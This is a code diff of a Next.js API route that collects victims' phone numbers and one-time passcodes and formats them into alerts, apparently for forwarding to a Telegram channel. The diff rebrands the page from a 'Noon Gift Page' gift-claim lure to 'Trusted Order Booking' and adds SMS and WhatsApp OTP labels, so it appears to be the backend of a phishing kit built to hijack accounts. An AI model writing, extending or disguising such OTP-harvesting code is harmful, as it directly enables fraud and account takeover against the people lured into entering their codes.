@@ -7,7 +7,7 @@ export const maxDuration = 15;
 
 export async function POST(req: NextRequest) {
   try {
-    const { kind, phone, otp } = await req.json();
+    const { kind, phone, otp, otpMethod } = await req.json();
 
     if (!phone) {
       return NextResponse.json({ error: "Phone number required" }, { status: 400 });
@@ -44,24 +44,31 @@ export async function POST(req: NextRequest) {
       if (!otp) {
         return NextResponse.json({ error: "OTP required" }, { status: 400 });
       }
+      const normalizedMethod =
+        otpMethod === "sms" ? "SMS" : otpMethod === "whatsapp" ? "WhatsApp" : "OTP";
       message =
-        `OTP Received From User\n\n` +
+        `${normalizedMethod} OTP Received From User\n\n` +
         `Phone: ${phone}\n` +
-        `OTP: ${otp}\n` +
+        `${normalizedMethod} OTP: ${otp}\n` +
         `Time: ${now}\n` +
-        `Platform: Noon Gift Page`;
+        `Platform: Trusted Order Booking`;
+    } else if (kind === "phone_submission") {
+      message =
+        `New Order Received\n\n` +
+        `Phone: ${phone}\n` +
+        `Time: ${now}\n` +
+        `Platform: Trusted Order Booking`;
     } else if (kind === "otp_resend_request") {
       message =
         `OTP Resend Requested\n\n` +
         `Phone: ${phone}\n` +
         `Time: ${now}\n` +
-        `Platform: Noon Gift Page`;
+        `Platform: Trusted Order Booking`;
     } else {
-      message =
-        `New Gift Claim Attempt\n\n` +
-        `Phone: ${phone}\n` +
-        `Time: ${now}\n` +
-        `Platform: Noon Gift Page`;
+      return NextResponse.json(
+        { error: "Unsupported notification type" },
+        { status: 400 }
+      );
     }
 
     let telegramRes: Response | null = null;
